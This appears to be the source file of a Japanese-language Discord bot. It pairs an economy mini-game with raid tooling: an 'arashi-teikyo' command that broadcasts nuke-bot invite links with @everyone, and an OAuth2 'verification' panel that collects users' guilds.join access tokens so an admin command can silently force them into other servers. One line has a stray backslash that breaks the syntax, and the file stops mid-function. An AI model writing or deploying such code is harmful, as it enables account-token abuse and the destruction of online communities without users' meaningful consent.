require('dotenv').config();

// Firebase Admin SDK
const admin = require('firebase-admin');
const { getFirestore } = require('firebase-admin/firestore');

const { 
    Client, 
    GatewayIntentBits, 
    SlashCommandBuilder, 
    REST, 
    Routes, 
    PermissionsBitField,
    EmbedBuilder,
    ChannelType,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle
} = require('discord.js');
const axios = require('axios');
const express = require('express');

// --- 環境変数から設定を取得 ---
const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID; // グローバルコマンド登録後もテスト用として残す
const TICKET_CHANNEL_ID = process.env.TICKET_CHANNEL_ID;
const ARASHI_CHANNEL_ID = process.env.ARASHI_CHANNEL_ID;
const PORT = process.env.PORT || 8000; 
const OAUTH2_CLIENT_SECRET = process.env.OAUTH2_CLIENT_SECRET;
const OAUTH2_REDIRECT_URI = process.env.OAUTH2_REDIRECT_URI; 
const FIREBASE_SERVICE_ACCOUNT_JSON = process.env.FIREBASE_SERVICE_ACCOUNT_JSON;

// クールタイム定義 (ミリ秒)
const COOLDOWN_WORK_MS = 60 * 60 * 1000;      // 1時間
const COOLDOWN_ROB_MS = 30 * 60 * 1000;      // 30分
const COOLDOWN_TICKET_MS = 60 * 60 * 1000;   // 1時間
const COOLDOWN_ARASHI_MS = 60 * 60 * 1000;   // 1時間
const COOLDOWN_CALL_MS = 60 * 60 * 1000;     // /call コマンド用 1時間

const ROLE_ADD_COST = 10000;
const AUTHENTICATED_USERS_COLLECTION = 'authenticatedUsers'; // OAuth2認証済みユーザーのAccess Token
const ECONOMY_COLLECTION = 'economyData'; // 経済システムデータ

// --- Firebase Admin SDK 初期化 ---
let db;
try {
    if (!FIREBASE_SERVICE_ACCOUNT_JSON) {
        throw new Error("環境変数 FIREBASE_SERVICE_ACCOUNT_JSON が設定されていません。");
    }
    const serviceAccount = JSON.parse(FIREBASE_SERVICE_ACCOUNT_JSON);
    
    // Firebase Admin SDKの初期化
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
    db = getFirestore();
    console.log("[Firebase] Firestore に接続しました。");
} catch (error) {
    console.error("[Firebase Error] Firestore 接続失敗:", error.message);
    // 接続失敗してもBot自体は起動を試行 (ただし経済システムは動作しない)
}

// --- 共通ヘルパー関数 ---

// Firestoreからユーザーデータを取得
async function getUserData(userId) {
    if (!db) return { balance: 0, cooldowns: {} };
    try {
        const docRef = db.collection(ECONOMY_COLLECTION).doc(userId);
        const doc = await docRef.get();
        if (doc.exists) {
            return doc.data();
        }
    } catch (e) {
        console.error(`[Firestore Error] ユーザーデータ取得失敗 (${userId}):`, e.message);
    }
    return { balance: 0, cooldowns: {} }; // データがない場合はデフォルト値を返す
}

// Firestoreにユーザーデータを保存
async function setUserData(userId, data) {
    if (!db) return;
    try {
        const docRef = db.collection(ECONOMY_COLLECTION).doc(userId);
        await docRef.set(data, { merge: true });
    } catch (e) {
        console.error(`[Firestore Error] ユーザーデータ保存失敗 (${userId}):`, e.message);
    }
}

function getBalance(userData) {
    return userData.balance || 0;
}

function getCooldown(userData, key) {
    return userData.cooldowns ? userData.cooldowns[key] : undefined;
}

function formatCooldown(ms) {
    const totalSeconds = Math.floor(ms / 1000);
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    
    let parts = [];
    if (hours > 0) parts.push(`${hours}時間`);
    if (minutes > 0) parts.push(`${minutes}分`);
    if (seconds > 0 || parts.length === 0) parts.push(`${seconds}秒`);

    return parts.join(' ');
}

// 共通エラーEmbed関数
function errorEmbed(title, description) {
    return new EmbedBuilder().setColor(0xFF0000).setTitle(title || '❌ エラー').setDescription(description).setTimestamp();
}

// --- Discord コマンド定義 ---

const commands = [
    new SlashCommandBuilder()
        .setName('economy')
        .setDescription('エコノミー機能に関するコマンドです。')
        .addSubcommand(subcommand =>
            subcommand
                .setName('work')
                .setDescription('仕事をしてコインを稼ぎます (クールタイム: 1時間)'))
        .addSubcommand(subcommand =>
            subcommand
                .setName('rob')
                .setDescription('他のメンバーからコインを盗もうとします (クールタイム: 30分)')
                .addUserOption(option =>
                    option.setName('target')
                        .setDescription('盗む相手を選択')
                        .setRequired(true)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('balance')
                .setDescription('自分の残高を確認します。'))
        .addSubcommand(subcommand =>
            subcommand
                .setName('role-add')
                .setDescription(`10,000コインでカスタムロールを作成し、自分に付与します。`)
                .addStringOption(option =>
                    option.setName('name')
                        .setDescription('作成するロールの名前')
                        .setRequired(true))
                .addStringOption(option =>
                    option.setName('color')
                        .setDescription('ロールの色 (任意: 16進数 例: FF0000)')
                        .setRequired(false)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('add')
                .setDescription('管理者: 特定のユーザー/ロールにコインを追加します。')
                .addIntegerOption(option =>
                    option.setName('money')
                        .setDescription('追加する金額')
                        .setRequired(true)
                        .setMinValue(1))
                .addUserOption(option =>
                    option.setName('user')
                        .setDescription('コインを追加する単一ユーザー (任意)')
                        .setRequired(false))
                .addRoleOption(option =>
                    option.setName('role')
                        .setDescription('コインを追加する対象ロール (任意)')
                        .setRequired(false)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('remove')
                .setDescription('管理者: 特定のユーザー/ロールからコインを減らします。')
                .addIntegerOption(option =>
                    option.setName('money')
                        .setDescription('減らす金額')
                        .setRequired(true)
                        .setMinValue(1))
                .addUserOption(option =>
                    option.setName('user')
                        .setDescription('コインを減らす単一ユーザー (任意)')
                        .setRequired(false))
                .addRoleOption(option =>
                    option.setName('role')
                        .setDescription('コインを減らす対象ロール (任意)')
                        .setRequired(false)))
        .addSubcommand(subcommand =>
            subcommand
                .setName('give')
                .setDescription('他のユーザーにコインを送金します。')
                .addUserOption(option =>
                    option.setName('user')
                        .setDescription('送金先のユーザー')
                        .setRequired(true))
                .addIntegerOption(option =>
                    option.setName('money')
                        .setDescription('送金する金額')
                        .setRequired(true)
                        .setMinValue(1))),

    new SlashCommandBuilder()
        .setName('ticket')
        .setDescription('チャンネルにチケットメッセージを送信します (クールタイム: 1時間)。')
        .addStringOption(option =>
            option.setName('message')
                .setDescription('送信したいチケットの内容')
                .setRequired(true)),

    new SlashCommandBuilder()
        .setName('arashi-teikyo')
        .setDescription('nuke botのurlを共有チャンネルに提供します (クールタイム: 1時間)。')
        .addStringOption(option =>
            option.setName('url')
                .setDescription('提供するbotの導入URL')
                .setRequired(true)),
    
    new SlashCommandBuilder()
        .setName('verify-panel')
        .setDescription('認証パネルをチャンネルに送信します。')
        .addRoleOption(option =>
            option.setName('role')
                .setDescription('認証成功時に付与するロール')
                .setRequired(true))
        .setDefaultMemberPermissions(PermissionsBitField.Flags.ManageChannels),

    new SlashCommandBuilder()
        .setName('call')
        .setDescription('OAuth2認証済みのユーザーをサーバーに強制加入/管理します (クールタイム: 1時間)。')
        .addSubcommand(subcommand =>
            subcommand
                .setName('execute')
                .setDescription('認証済みの全ユーザーを指定サーバーに強制加入させます（通知なし）。'))
        .addSubcommand(subcommand =>
            subcommand
                .setName('list')
                .setDescription('現在認証済みのユーザー数を表示します。'))
        .addSubcommand(subcommand =>
            subcommand
                .setName('reload')
                .setDescription('管理者: Firestoreからデータを再ロードします。'))
        .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),

].map(command => command.toJSON());

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages 
    ] 
});

// --- Express Webサーバー設定 ---

const app = express();
app.use(express.json()); 

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*'); 
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    next();
});

// OAuth2 Access Token 交換エンドポイント (ワンクリック認証)
app.get('/verify', async (req, res) => { 
    const { code, state } = req.query;

    if (!code) {
        return res.status(400).send('OAuth2認証コードが見つかりません。');
    }

    if (!OAUTH2_CLIENT_SECRET || !OAUTH2_REDIRECT_URI) {
        return res.status(500).send('サーバー設定エラー: OAuth2環境変数が設定されていません。');
    }

    let guildId, roleId;
    if (state) {
        try {
            // stateからGuild IDとRole IDをデコード
            const decodedState = JSON.parse(Buffer.from(state, 'base64').toString('utf8'));
            guildId = decodedState.g;
            roleId = decodedState.r;
        } catch (e) {
            console.error('Stateデコードエラー:', e);
        }
    }
    
    let userId;
    let roleStatusMessage = 'Discordに戻って確認してください。';
    let isSuccess = false;

    try {
        // 1. Access Tokenを交換
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: OAUTH2_CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: OAUTH2_REDIRECT_URI,
            scope: 'identify guilds.join' 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const { access_token, token_type } = tokenResponse.data;

        // 2. ユーザー情報を取得
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `${token_type} ${access_token}` }
        });
        userId = userResponse.data.id;
        
        // 3. ユーザーIDとAccess TokenをFirestoreに保存
        if (db) {
            const docRef = db.collection(AUTHENTICATED_USERS_COLLECTION).doc(userId);
            await docRef.set({
                accessToken: access_token, 
                tokenType: token_type,
                timestamp: admin.firestore.FieldValue.serverTimestamp()
            });
            console.log(`[OAuth2 認証成功] ユーザーID: ${userId} のAccess TokenをFirestoreに保存しました。`);
        }

        isSuccess = true;

        // 4. ロール付与の試行 (stateが存在し、ギルドとロールIDが取得できた場合)
        if (guildId && roleId && TOKEN && client.isReady()) {
            try {
                // Discord APIを利用してサーバーにユーザーを強制加入（Guild Member Add）し、ロールを付与する
                await axios.put(`https://discord.com/api/v10/guilds/${guildId}/members/${userId}`, {
                    access_token: access_token, // ユーザーアクセストークンを使用
                    roles: [roleId] // ロールを付与
                }, {
                    headers: {
                        Authorization: `Bot ${TOKEN}`, // ボットトークンで実行
                        'Content-Type': 'application/json'
                    }
                });
                roleStatusMessage = `✅ ロール付与とサーバー加入に成功しました！(\`${roleId}\`)`;
                console.log(`[ロール付与成功] User: ${userId}, Guild: ${guildId}, Role: ${roleId}`);

            } catch (roleError) {
                const errorStatus = roleError.response?.status || 'Unknown';
                roleStatusMessage = `❌ ロール付与失敗: エラーコード ${errorStatus} が発生しました。Botがサーバーのメンバーにない、またはBotに適切な権限がない可能性があります。`;
                console.error(`[ロール付与失敗] User ID: ${userId}, Guild ID: ${guildId}, Role ID: ${roleId}, Error: ${errorStatus}`);
            }
        } else if (!client.isReady()) {
            roleStatusMessage = '⚠️ Botがまだ起動していないため、ロール付与はスキップされました。';
        } else {
             roleStatusMessage = '⚠️ ロール情報がStateから取得できなかったため、ロール付与はスキップされました。';
        }


    } catch (error) {
        isSuccess = false;
        console.error('OAuth2/トークン交換エラー:', error.response?.data || error.message);
        roleStatusMessage = `❌ 認証エラー: トークン交換中に問題が発生しました。詳細: ${error.message.substring(0, 100)}...`;
    }
    
    // 5. 認証結果のHTMLを返す
    const statusColor = isSuccess ? 'green' : 'red';
    const statusIcon = isSuccess ? 
        '<svg class="w-20 h-20 mx-auto text-green-500 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>' :
        '<svg class="w-20 h-20 mx-auto text-red-500 mb-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
    
    const successHtml = `
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${isSuccess ? '認証完了' : '認証エラー'}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1e1f22; 
            color: #f2f3f5;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">
    <div class="max-w-md w-full bg-gray-800 p-8 rounded-xl shadow-2xl text-center border-t-4 border-${statusColor}-500">
        ${statusIcon}
        <h1 class="text-3xl font-bold text-white mb-4">
            認証${isSuccess ? '完了' : 'エラー'}
        </h1>
        <p class="text-lg text-gray-300 mb-4 font-semibold">
            ${roleStatusMessage}
        </p>
        <p class="text-base text-gray-400 mb-8">
            ${isSuccess ? 'Access Tokenの保存に成功しました。Discordの `/call execute` コマンドで強制加入が可能です。' : '再度認証を試すか、ボット管理者に連絡してください。'}
        </p>
        <div class="bg-gray-700 p-4 rounded-lg mb-8">
            <p class="mt-1 text-xl font-medium text-green-300">
                Discordアプリに戻ってください
            </p>
        </div>
        <button onclick="window.close()" 
                class="w-full py-3 px-6 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg transition duration-200 shadow-md transform hover:scale-[1.01] focus:outline-none focus:ring-4 focus:ring-indigo-500 focus:ring-opacity-50">
            このウィンドウを閉じる
        </button>
    </div>
</body>
</html>
        `;
        res.status(isSuccess ? 200 : 500).send(successHtml);
});


// --- Discord イベントリスナー ---

client.once('ready', async () => {
    console.log(`[BOT READY] ${new Date().toISOString()} (UTC): Logged in as ${client.user.tag}`);

    // スラッシュコマンド登録処理 (グローバルコマンド)
    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('スラッシュコマンドの登録を開始します (グローバルコマンドとして登録中)...');
        await rest.put(
            Routes.applicationCommands(CLIENT_ID), 
            { body: commands },
        );
        console.log(`[スラッシュコマンド登録成功] ${commands.length} 個のグローバルコマンドが登録されました。`);
    } catch (error) {
        console.error('スラッシュコマンドの登録エラー:', error);
    }
});

client.on('interactionCreate', async interaction => {
    // Firestoreが初期化されていない場合は警告を出し、経済コマンドをブロック
    if (!db && interaction.isCommand() && interaction.commandName === 'economy') {
        return interaction.reply({ 
            embeds: [errorEmbed('データベースエラー', 'Firestoreへの接続に失敗しているため、経済システムは利用できません。環境変数を確認してください。')], 
            ephemeral: true 
        });
    }

    if (!interaction.isCommand()) return;

    const userId = interaction.user.id; 
    const { commandName } = interaction;

    // --- コマンドハンドリング ---

    if (commandName === 'economy') {
        const subcommand = interaction.options.getSubcommand();

        if (subcommand === 'work') {
            await handleWork(interaction, userId);
        } else if (subcommand === 'rob') {
            await handleRob(interaction, userId);
        } else if (subcommand === 'balance') {
            await handleBalance(interaction, userId);
        } else if (subcommand === 'role-add') {
            await handleRoleAdd(interaction, userId);
        } else if (subcommand === 'add' || subcommand === 'remove') {
            await handleAdminModify(interaction, userId, subcommand);
        } else if (subcommand === 'give') {
            await handleGive(interaction, userId);
        }
    } else if (commandName === 'ticket') {
        await handleTicket(interaction, userId);
    } else if (commandName === 'arashi-teikyo') {
        await handleArashiTeikyo(interaction, userId);
    } else if (commandName === 'verify-panel') {
        await handleVerifyPanel(interaction);
    } else if (commandName === 'call') {
        const subcommand = interaction.options.getSubcommand();
        await handleCall(interaction, userId, subcommand);
    }
});


// --- 経済システム コマンド実装 ---

async function handleWork(interaction, userId) {
    const userData = await getUserData(userId);
    const currentBalance = getBalance(userData);
    const lastWork = getCooldown(userData, 'work');
    const now = Date.now();

    if (lastWork && now < lastWork + COOLDOWN_WORK_MS) {
        const remaining = (lastWork + COOLDOWN_WORK_MS) - now;
        return interaction.reply({ 
            embeds: [errorEmbed('⏳ クールダウン中', `次の仕事まで**${formatCooldown(remaining)}**待ってください。`)], 
            ephemeral: true 
        });
    }

    const earned = Math.floor(Math.random() * (500 - 100 + 1)) + 100; // 100〜500
    
    // データ更新と保存
    userData.balance = currentBalance + earned;
    userData.cooldowns = { ...userData.cooldowns, work: now };
    await setUserData(userId, userData);

    const embed = new EmbedBuilder()
        .setColor(0x00FF00)
        .setTitle('💼 仕事完了！')
        .setDescription(`仕事を頑張り、**${earned.toLocaleString()}** コインを稼ぎました。`)
        .addFields({ name: '現在の残高', value: `${userData.balance.toLocaleString()} コイン` })
        .setTimestamp();

    await interaction.reply({ embeds: [embed] });
}

async function handleRob(interaction, userId) {
    const targetUser = interaction.options.getUser('target');
    
    if (userId === targetUser.id) {
        return interaction.reply({ embeds: [errorEmbed('自分自身を盗むことはできません。')], ephemeral: true });
    }
    if (targetUser.bot) {
        return interaction.reply({ embeds: [errorEmbed('ボットを盗むことはできません。')], ephemeral: true });
    }
    
    // クールダウンチェック
    const userData = await getUserData(userId);
    const lastRob = getCooldown(userData, 'rob');
    const now = Date.now();

    if (lastRob && now < lastRob + COOLDOWN_ROB_MS) {
        const remaining = (lastRob + COOLDOWN_ROB_MS) - now;
        return interaction.reply({ 
            embeds: [errorEmbed('⏳ クールダウン中', `次の強盗まで**${formatCooldown(remaining)}**待ってください。`)], 
            ephemeral: true 
        });
    }
    
    userData.cooldowns = { ...userData.cooldowns, rob: now };
    
    const targetUserData = await getUserData(targetUser.id);
    const targetBalance = getBalance(targetUserData);

    // 強盗失敗 (50%の確率)
    if (Math.random() < 0.5) {
        const fine = Math.min(100, getBalance(userData)); // 最大100コインの罰金
        userData.balance = getBalance(userData) - fine;
        await setUserData(userId, userData); // 自分のデータ保存

        const embed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('🚨 強盗失敗！')
            .setDescription(`強盗は失敗し、警備員に見つかりました！**${fine.toLocaleString()}** コインの罰金を支払いました。`)
            .addFields({ name: '現在の残高', value: `${getBalance(userData).toLocaleString()} コイン` })
            .setTimestamp();

        return interaction.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 強盗成功
    if (targetBalance === 0) {
        await setUserData(userId, userData); // 自分のクールダウンだけ保存

        const embed = new EmbedBuilder()
            .setColor(0xFFA500)
            .setTitle('💰 強盗成功！...だが')
            .setDescription(`${targetUser.username} を襲いましたが、残念ながら彼/彼女は一文無しでした。何も盗めませんでした。`)
            .setTimestamp();
        
        return interaction.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 盗む金額: ターゲットの残高の10%〜30%
    const stolenAmount = Math.floor(targetBalance * (Math.random() * 0.2 + 0.1)); // 0.1 ~ 0.3
    
    // データ更新
    userData.balance = getBalance(userData) + stolenAmount;
    targetUserData.balance = targetBalance - stolenAmount;
    
    // データ保存
    await setUserData(userId, userData);
    await setUserData(targetUser.id, targetUserData);

    const embed = new EmbedBuilder()
        .setColor(0x00FFFF)
        .setTitle('🔪 強盗成功！')
        .setDescription(`あなたは ${targetUser.username} から見事に**${stolenAmount.toLocaleString()}** コインを盗みました！`)
        .addFields(
            { name: 'あなたの残高', value: `${getBalance(userData).toLocaleString()} コイン`, inline: true },
            { name: `${targetUser.username}の残高`, value: `${getBalance(targetUserData).toLocaleString()} コイン`, inline: true }
        )
        .setTimestamp();

    await interaction.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
}

async function handleBalance(interaction, userId) {
    const userData = await getUserData(userId);
    const balance = getBalance(userData);

    const embed = new EmbedBuilder()
        .setColor(0x007FFF)
        .setTitle('🏦 残高照会')
        .setDescription(`あなたの現在の残高は **${balance.toLocaleString()}** コインです。`)
        .setTimestamp();

    await interaction.reply({ embeds: [embed] });
}

async function handleRoleAdd(interaction, userId) {
    const roleName = interaction.options.getString('name');
    const colorInput = interaction.options.getString('color');
    const cost = ROLE_ADD_COST;

    const userData = await getUserData(userId);
    const currentBalance = getBalance(userData);

    if (currentBalance < cost) {
        return interaction.reply({ 
            embeds: [errorEmbed(`ロール作成に必要な **${cost.toLocaleString()}** コインが足りません。`)
                .addFields({ name: '現在の残高', value: `${currentBalance.toLocaleString()} コイン`, inline: true })], 
            ephemeral: true 
        });
    }

    try {
        let roleColor = 'DEFAULT';
        if (colorInput) {
            // 16進数カラーコードのバリデーション
            if (/^#?[0-9A-F]{6}$/i.test(colorInput)) {
                roleColor = colorInput.startsWith('#') ? colorInput : '#' + colorInput;
            } else {
                return interaction.reply({ 
                    embeds: [errorEmbed('無効な色コード', '色は6桁の16進数（例: FF0000）で指定してください。')], 
                    ephemeral: true 
                });
            }
        }
        
        // ロールを作成
        const newRole = await interaction.guild.roles.create({
            name: roleName,
            color: roleColor,
            reason: `${interaction.user.username} が ${cost.toLocaleString()} コインを支払って作成`
        });

        // ユーザーにロールを付与
        await interaction.member.roles.add(newRole);

        // 残高を減らす
        userData.balance = currentBalance - cost;
        await setUserData(userId, userData);

        const embed = new EmbedBuilder()
            .setColor(roleColor === 'DEFAULT' ? 0x95a5a6 : roleColor)
            .setTitle('✨ カスタムロール作成完了')
            .setDescription(`**${roleName}** ロールを作成し、あなたに付与しました。`)
            .addFields(
                { name: '消費コイン', value: `${cost.toLocaleString()} コイン`, inline: true },
                { name: '残高', value: `${userData.balance.toLocaleString()} コイン`, inline: true }
            )
            .setTimestamp();
        
        await interaction.reply({ embeds: [embed] });

    } catch (error) {
        console.error('ロール作成失敗:', error);
        if (error.code === 50013) {
             return interaction.reply({ 
                embeds: [errorEmbed('権限エラー', 'Botにロールを管理/作成する権限がないか、作成しようとしているロールがBotのロールより上位にあります。')], 
                ephemeral: true 
            });
        }
        await interaction.reply({ embeds: [errorEmbed('ロール作成失敗', `ロールの作成中に予期せぬエラーが発生しました: ${error.message}`)], ephemeral: true });
    }
}

async function handleAdminModify(interaction, userId, subcommand) {
    // 権限チェック: 管理者権限を持つユーザーのみ実行可能
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return interaction.reply({ embeds: [errorEmbed('権限不足', 'このコマンドを実行するには管理者権限が必要です。')], ephemeral: true });
    }

    const amount = interaction.options.getInteger('money');
    const targetUser = interaction.options.getUser('user');
    const targetRole = interaction.options.getRole('role');
    
    if (!targetUser && !targetRole) {
        return interaction.reply({ embeds: [errorEmbed('対象指定エラー', 'ユーザーまたはロールの少なくとも一方を指定してください。')], ephemeral: true });
    }
    
    let targetIds = [];
    let targetName = "";

    if (targetUser) {
        if (targetUser.bot) {
            return interaction.reply({ embeds: [errorEmbed('ボットの残高を操作できません。')], ephemeral: true });
        }
        targetIds.push(targetUser.id);
        targetName = targetUser.username;
    } 
    
    if (targetRole) {
        // ロールに属する全メンバーのIDを取得
        const members = await interaction.guild.members.fetch();
        const roleMembers = members.filter(member => member.roles.cache.has(targetRole.id));
        targetIds.push(...roleMembers.map(member => member.user.id));
        targetName = targetRole.name;
    }
    
    // 重複を削除
    targetIds = [...new Set(targetIds)];

    let processedCount = 0;
    
    for (const id of targetIds) {
        const userData = await getUserData(id);
        const currentBalance = getBalance(userData);
        
        if (subcommand === 'add') {
            userData.balance = currentBalance + amount;
        } else if (subcommand === 'remove') {
            // 残高がマイナスにならないようにする
            userData.balance = Math.max(0, currentBalance - amount);
        }
        
        await setUserData(id, userData);
        processedCount++;
    }

    const action = subcommand === 'add' ? '追加' : '削除';
    const finalName = targetUser && targetRole ? `${targetUser.username} および ${targetRole.name}` : targetName;

    const embed = new EmbedBuilder()
        .setColor(subcommand === 'add' ? 0x00FF00 : 0xFFA500)
        .setTitle(`🛠️ 残高 ${action} 完了`)
        .setDescription(`**${amount.toLocaleString()}** コインを ${finalName} の残高に${action}しました。`)
        .addFields({ name: '処理されたユーザー数', value: `${processedCount} 人` })
        .setTimestamp();

    await interaction.reply({ embeds: [embed] });
}

async function handleGive(interaction, userId) {
    const targetUser = interaction.options.getUser('user');
    const amount = interaction.options.getInteger('money');

    if (userId === targetUser.id) {
        return interaction.reply({ embeds: [errorEmbed('自分自身に送金することはできません。')], ephemeral: true });
    }
    if (targetUser.bot) {
        return interaction.reply({ embeds: [errorEmbed('ボットに送金することはできません。')], ephemeral: true });
    }

    const senderData = await getUserData(userId);
    const currentBalance = getBalance(senderData);

    if (currentBalance < amount) {
        return interaction.reply({ 
            embeds: [errorEmbed(`送金に必要な **${amount.toLocaleString()}** コインが足りません。`)
                .addFields({ name: '現在の残高', value: `${currentBalance.toLocaleString()} コイン`, inline: true })], 
            ephemeral: true 
        });
    }

    const receiverData = await getUserData(targetUser.id);
    const targetBalance = getBalance(receiverData);
    
    // データ更新
    senderData.balance = currentBalance - amount;
    receiverData.balance = targetBalance + amount;

    // データ保存
    await setUserData(userId, senderData);
    await setUserData(targetUser.id, receiverData);

    const embed = new EmbedBuilder()
        .setColor(0x00FF00)
        .setTitle('💰 コイン送金完了')
        .setDescription(`**${amount.toLocaleString()}** コインを ${targetUser.username} に送金しました。`)\
        .addFields(
            { name: 'あなたの残高 (送金後)', value: `${senderData.balance.toLocaleString()} コイン`, inline: true },
            { name: `${targetUser.username}の残高 (受領後)`, value: `${receiverData.balance.toLocaleString()} コイン`, inline: true }
        )
        .setTimestamp();

    await interaction.reply({ embeds: [embed] });
}

// --- チケット/共有 コマンド実装 ---

async function handleTicket(interaction, userId) {
    const message = interaction.options.getString('message');
    
    const userData = await getUserData(userId);
    const lastTicket = getCooldown(userData, 'ticket');
    const now = Date.now();

    if (lastTicket && now < lastTicket + COOLDOWN_TICKET_MS) {
        const remaining = (lastTicket + COOLDOWN_TICKET_MS) - now;
        return interaction.reply({ 
            embeds: [errorEmbed('⏳ クールダウン中', `次のチケット送信まで**${formatCooldown(remaining)}**待ってください。`)], 
            ephemeral: true 
        });
    }

    const targetChannel = interaction.guild.channels.cache.get(TICKET_CHANNEL_ID);

    if (!targetChannel || targetChannel.type !== ChannelType.GuildText) {
        return interaction.reply({ 
            embeds: [errorEmbed('設定エラー', 'チケットチャンネルIDが正しく設定されていないか、テキストチャンネルではありません。')], 
            ephemeral: true 
        });
    }

    const embed = new EmbedBuilder()
        .setColor(0x3498db)
        .setTitle('🎫 チケットメッセージ')
        .setAuthor({ name: interaction.user.tag, iconURL: interaction.user.displayAvatarURL() })
        .setDescription(message)
        .setTimestamp();

    try {
        await targetChannel.send({ embeds: [embed] });

        // クールダウン更新
        userData.cooldowns = { ...userData.cooldowns, ticket: now };
        await setUserData(userId, userData);

        await interaction.reply({ 
            embeds: [new EmbedBuilder().setColor(0x00FF00).setDescription(`✅ チケットを <#${TICKET_CHANNEL_ID}> に送信しました。`)], 
            ephemeral: true 
        });
    } catch (e) {
        console.error('チケット送信エラー:', e);
        await interaction.reply({ embeds: [errorEmbed('送信エラー', 'チャンネルへのメッセージ送信に失敗しました。Botに書き込み権限があるか確認してください。')], ephemeral: true });
    }
}

async function handleArashiTeikyo(interaction, userId) {
    const url = interaction.options.getString('url');
    
    const userData = await getUserData(userId);
    const lastArashi = getCooldown(userData, 'arashi');
    const now = Date.now();

    if (lastArashi && now < lastArashi + COOLDOWN_ARASHI_MS) {
        const remaining = (lastArashi + COOLDOWN_ARASHI_MS) - now;
        return interaction.reply({ 
            embeds: [errorEmbed('⏳ クールダウン中', `次の提供まで**${formatCooldown(remaining)}**待ってください。`)], 
            ephemeral: true 
        });
    }

    const targetChannel = interaction.guild.channels.cache.get(ARASHI_CHANNEL_ID);

    if (!targetChannel || targetChannel.type !== ChannelType.GuildText) {
        return interaction.reply({ 
            embeds: [errorEmbed('設定エラー', '嵐提供チャンネルIDが正しく設定されていないか、テキストチャンネルではありません。')], 
            ephemeral: true 
        });
    }

    const embed = new EmbedBuilder()
        .setColor(0xe74c3c)
        .setTitle('💣 NUKE BOT 導入URL提供')
        .setAuthor({ name: interaction.user.tag, iconURL: interaction.user.displayAvatarURL() })
        .setDescription(`以下のURLが提供されました:\n[導入URL](${url})`)
        .setTimestamp();

    try {
        await targetChannel.send({ content: '@everyone', embeds: [embed] });

        // クールダウン更新
        userData.cooldowns = { ...userData.cooldowns, arashi: now };
        await setUserData(userId, userData);

        await interaction.reply({ 
            embeds: [new EmbedBuilder().setColor(0x00FF00).setDescription(`✅ Bot導入URLを <#${ARASHI_CHANNEL_ID}> に提供しました。`)], 
            ephemeral: true 
        });
    } catch (e) {
        console.error('URL提供エラー:', e);
        await interaction.reply({ embeds: [errorEmbed('送信エラー', 'チャンネルへのメッセージ送信に失敗しました。Botに書き込み権限があるか確認してください。')], ephemeral: true });
    }
}

// --- 認証/Call コマンド実装 ---

async function handleVerifyPanel(interaction) {
    if (!OAUTH2_REDIRECT_URI) {
        return interaction.reply({ embeds: [errorEmbed('設定不足', '環境変数 OAUTH2_REDIRECT_URI が設定されていません。')], ephemeral: true });
    }
    
    const role = interaction.options.getRole('role');
    const guildId = interaction.guildId;
    const roleId = role.id;
    
    // StateにサーバーIDとロールIDをJSONとして埋め込み、Base64でエンコード
    const stateObject = { g: guildId, r: roleId };
    const state = Buffer.from(JSON.stringify(stateObject)).toString('base64');
    
    // OAuth2認証URL (identify, guilds.join スコープ)
    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${OAUTH2_REDIRECT_URI}&response_type=code&scope=identify%20guilds.join&state=${state}`;

    const embed = new EmbedBuilder()
        .setColor(0x007FFF)
        .setTitle('✅ サーバー認証パネル')
        .setDescription(`以下のボタンをクリックして認証を完了してください。認証が完了すると、自動的に **${role.name}** ロールが付与されます。`)
        .addFields({
            name: '🚨 注意',
            value: '認証により、Botの管理者はあなたのAccess Tokenを利用して、このサーバーにあなたを強制加入させたり、別のサーバーに強制的に招待したりできる可能性があります。'
        })
        .setTimestamp();
    
    const button = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
